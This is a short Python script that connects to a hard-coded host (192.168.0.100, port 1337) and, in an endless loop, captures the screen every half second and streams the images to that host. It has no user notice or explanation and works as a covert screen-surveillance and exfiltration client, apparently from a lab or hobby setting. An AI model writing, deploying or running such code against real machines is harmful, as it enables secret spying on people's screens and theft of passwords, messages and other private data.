import socket
from PIL import ImageGrab, Image
import io
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.100",1337))
while True:
    screenshot = ImageGrab.grab()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes,"PPM")
    s.send(img_bytes.getvalue())
    s.send("EOF".encode())
    time.sleep(0.5)